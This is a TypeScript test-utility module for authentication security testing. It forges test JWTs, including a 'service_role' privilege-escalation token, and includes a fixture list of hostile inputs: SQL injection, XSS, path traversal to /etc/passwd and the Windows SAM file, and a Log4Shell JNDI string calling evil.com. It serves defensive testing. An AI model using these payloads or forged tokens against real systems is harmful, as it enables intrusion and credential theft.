/**
 * Authentication Security Test Utilities
 * 
 * Helper functions and utilities for authentication security testing
 */

import { createClient } from '@supabase/supabase-js';
import { sign, verify } from 'jsonwebtoken';

export interface TestUser {
  id: string;
  email: string;
  subscription_tier: 'free' | 'pro' | 'pro_byok';
  created_at: string;
  last_sign_in_at?: string;
}

export interface AuthTestContext {
  user: TestUser;
  token: string;
  refreshToken?: string;
  sessionId?: string;
}

export class AuthSecurityTestUtils {
  private static readonly JWT_SECRET = 'test-jwt-secret-key';
  private static readonly REFRESH_SECRET = 'test-refresh-secret-key';

  /**
   * Generate a valid test JWT token
   */
  static generateValidToken(user: TestUser, expiresIn: string = '1h'): string {
    const payload = {
      sub: user.id,
      email: user.email,
      aud: 'authenticated',
      role: 'authenticated',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (expiresIn === '1h' ? 3600 : 60)
    };

    return sign(payload, this.JWT_SECRET, { algorithm: 'HS256' });
  }

  /**
   * Generate an expired JWT token
   */
  static generateExpiredToken(user: TestUser): string {
    const payload = {
      sub: user.id,
      email: user.email,
      aud: 'authenticated',
      role: 'authenticated',
      iat: Math.floor(Date.now() / 1000) - 7200, // 2 hours ago
      exp: Math.floor(Date.now() / 1000) - 3600  // 1 hour ago (expired)
    };

    return sign(payload, this.JWT_SECRET, { algorithm: 'HS256' });
  }

  /**
   * Generate a token with invalid signature
   */
  static generateInvalidSignatureToken(user: TestUser): string {
    const payload = {
      sub: user.id,
      email: user.email,
      aud: 'authenticated',
      role: 'authenticated',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };

    // Sign with wrong secret
    return sign(payload, 'wrong-secret', { algorithm: 'HS256' });
  }

  /**
   * Generate a malformed JWT token
   */
  static generateMalformedToken(): string {
    return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.malformed.signature';
  }

  /**
   * Generate a token with privilege escalation attempt
   */
  static generatePrivilegeEscalationToken(user: TestUser): string {
    const payload = {
      sub: user.id,
      email: user.email,
      aud: 'authenticated',
      role: 'service_role', // Attempting to escalate to service role
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600
    };

    return sign(payload, this.JWT_SECRET, { algorithm: 'HS256' });
  }

  /**
   * Create a test user with specified properties
   */
  static createTestUser(overrides: Partial<TestUser> = {}): TestUser {
    return {
      id: `test-user-${Date.now()}`,
      email: `test-${Date.now()}@example.com`,
      subscription_tier: 'free',
      created_at: new Date().toISOString(),
      last_sign_in_at: new Date().toISOString(),
      ...overrides
    };
  }

  /**
   * Create a complete auth test context
   */
  static createAuthContext(userOverrides: Partial<TestUser> = {}): AuthTestContext {
    const user = this.createTestUser(userOverrides);
    const token = this.generateValidToken(user);
    const refreshToken = this.generateRefreshToken(user);
    const sessionId = `session-${Date.now()}`;

    return {
      user,
      token,
      refreshToken,
      sessionId
    };
  }

  /**
   * Generate a refresh token
   */
  static generateRefreshToken(user: TestUser): string {
    const payload = {
      sub: user.id,
      type: 'refresh',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (30 * 24 * 3600) // 30 days
    };

    return sign(payload, this.REFRESH_SECRET, { algorithm: 'HS256' });
  }

  /**
   * Validate token structure and claims
   */
  static validateTokenStructure(token: string): {
    valid: boolean;
    payload?: any;
    error?: string;
  } {
    try {
      const payload = verify(token, this.JWT_SECRET, { algorithms: ['HS256'] });
      return { valid: true, payload };
    } catch (error) {
      return { 
        valid: false, 
        error: error instanceof Error ? error.message : 'Unknown error' 
      };
    }
  }

  /**
   * Simulate authentication failure scenarios
   */
  static getAuthFailureScenarios(): Array<{
    name: string;
    token: string;
    expectedError: string;
  }> {
    const testUser = this.createTestUser();
    
    return [
      {
        name: 'Missing token',
        token: '',
        expectedError: 'No token provided'
      },
      {
        name: 'Invalid format',
        token: 'not-a-jwt-token',
        expectedError: 'Invalid token format'
      },
      {
        name: 'Expired token',
        token: this.generateExpiredToken(testUser),
        expectedError: 'Token expired'
      },
      {
        name: 'Invalid signature',
        token: this.generateInvalidSignatureToken(testUser),
        expectedError: 'Invalid signature'
      },
      {
        name: 'Malformed token',
        token: this.generateMalformedToken(),
        expectedError: 'Malformed token'
      },
      {
        name: 'Privilege escalation attempt',
        token: this.generatePrivilegeEscalationToken(testUser),
        expectedError: 'Invalid role'
      }
    ];
  }

  /**
   * Generate test headers for authentication
   */
  static generateAuthHeaders(token: string, additionalHeaders: Record<string, string> = {}): Record<string, string> {
    return {
      'Authorization': `Bearer ${token}`,
      'Content-Type': 'application/json',
      'User-Agent': 'AuthSecurityTest/1.0',
      'X-Forwarded-For': '192.168.1.100',
      ...additionalHeaders
    };
  }

  /**
   * Simulate concurrent authentication attempts
   */
  static async simulateConcurrentAuth(
    token: string,
    concurrency: number = 10,
    endpoint: string = '/api/protected'
  ): Promise<Response[]> {
    const requests = Array.from({ length: concurrency }, () =>
      fetch(`http://localhost:3000${endpoint}`, {
        headers: this.generateAuthHeaders(token)
      })
    );

    return Promise.all(requests);
  }

  /**
   * Generate suspicious IP patterns for testing
   */
  static getSuspiciousIPPatterns(): string[] {
    return [
      '192.168.1.100', // Same IP multiple times
      '10.0.0.1',      // Internal IP
      '127.0.0.1',     // Localhost
      '0.0.0.0',       // Invalid IP
      '999.999.999.999', // Invalid IP format
      '192.168.1.101', // Sequential IPs (potential scanning)
      '192.168.1.102',
      '192.168.1.103'
    ];
  }

  /**
   * Generate rate limiting test scenarios
   */
  static getRateLimitingScenarios(): Array<{
    name: string;
    requestCount: number;
    timeWindow: number;
    expectedBlocked: number;
  }> {
    return [
      {
        name: 'Normal usage',
        requestCount: 5,
        timeWindow: 60000, // 1 minute
        expectedBlocked: 0
      },
      {
        name: 'Burst requests',
        requestCount: 50,
        timeWindow: 10000, // 10 seconds
        expectedBlocked: 40 // Assuming limit of 10/10s
      },
      {
        name: 'Sustained high rate',
        requestCount: 100,
        timeWindow: 60000, // 1 minute
        expectedBlocked: 80 // Assuming limit of 20/min
      }
    ];
  }

  /**
   * Mock Supabase auth responses
   */
  static getMockAuthResponses() {
    return {
      validUser: {
        data: {
          user: {
            id: 'user-123',
            email: 'test@example.com',
            aud: 'authenticated',
            role: 'authenticated'
          }
        },
        error: null
      },
      invalidToken: {
        data: { user: null },
        error: { message: 'Invalid JWT' }
      },
      expiredToken: {
        data: { user: null },
        error: { message: 'JWT expired' }
      },
      networkError: {
        data: { user: null },
        error: { message: 'Network error' }
      }
    };
  }

  /**
   * Generate session fingerprint for testing
   */
  static generateSessionFingerprint(userAgent: string, ip: string): string {
    const crypto = require('crypto');
    return crypto
      .createHash('sha256')
      .update(`${userAgent}:${ip}`)
      .digest('hex');
  }

  /**
   * Validate session security properties
   */
  static validateSessionSecurity(sessionData: any): {
    secure: boolean;
    issues: string[];
  } {
    const issues: string[] = [];

    if (!sessionData.httpOnly) {
      issues.push('Session cookie should be httpOnly');
    }

    if (!sessionData.secure) {
      issues.push('Session cookie should be secure');
    }

    if (!sessionData.sameSite || sessionData.sameSite === 'none') {
      issues.push('Session cookie should have sameSite protection');
    }

    if (!sessionData.expires || new Date(sessionData.expires) < new Date()) {
      issues.push('Session should have valid expiration');
    }

    return {
      secure: issues.length === 0,
      issues
    };
  }

  /**
   * Generate authentication timing attack test data
   */
  static generateTimingAttackData(): Array<{
    email: string;
    password: string;
    expectedTiming: 'fast' | 'slow';
  }> {
    return [
      {
        email: 'nonexistent@example.com',
        password: 'password123',
        expectedTiming: 'fast' // Should fail quickly for non-existent user
      },
      {
        email: 'existing@example.com',
        password: 'wrongpassword',
        expectedTiming: 'slow' // Should take time to verify password
      },
      {
        email: 'existing@example.com',
        password: 'correctpassword',
        expectedTiming: 'slow' // Should take time to verify password
      }
    ];
  }

  /**
   * Measure authentication response time
   */
  static async measureAuthTime(
    email: string,
    password: string
  ): Promise<number> {
    const start = performance.now();
    
    try {
      // Simulate auth request
      await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
    } catch (error) {
      // Ignore errors for timing measurement
    }
    
    const end = performance.now();
    return end - start;
  }

  /**
   * Generate CSRF token for testing
   */
  static generateCSRFToken(): string {
    const crypto = require('crypto');
    return crypto.randomBytes(32).toString('hex');
  }

  /**
   * Validate CSRF protection
   */
  static validateCSRFProtection(
    token: string,
    expectedToken: string
  ): boolean {
    return token === expectedToken;
  }
}

/**
 * Authentication security test fixtures
 */
export const AuthTestFixtures = {
  validUsers: [
    {
      id: 'user-1',
      email: 'user1@example.com',
      subscription_tier: 'free' as const,
      created_at: '2024-01-01T00:00:00Z'
    },
    {
      id: 'user-2',
      email: 'user2@example.com',
      subscription_tier: 'pro' as const,
      created_at: '2024-01-01T00:00:00Z'
    },
    {
      id: 'admin-1',
      email: 'admin@example.com',
      subscription_tier: 'pro_byok' as const,
      created_at: '2024-01-01T00:00:00Z'
    }
  ],

  maliciousPayloads: [
    "'; DROP TABLE users; --",
    '<script>alert("xss")</script>',
    '../../etc/passwd',
    '${jndi:ldap://evil.com/a}',
    '../../../windows/system32/config/sam'
  ],

  suspiciousUserAgents: [
    'sqlmap/1.0',
    'Nikto/2.1.6',
    'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
    'python-requests/2.25.1',
    'curl/7.68.0'
  ],

  commonPasswords: [
    'password',
    '123456',
    'admin',
    'letmein',
    'welcome',
    'monkey',
    'dragon'
  ]
};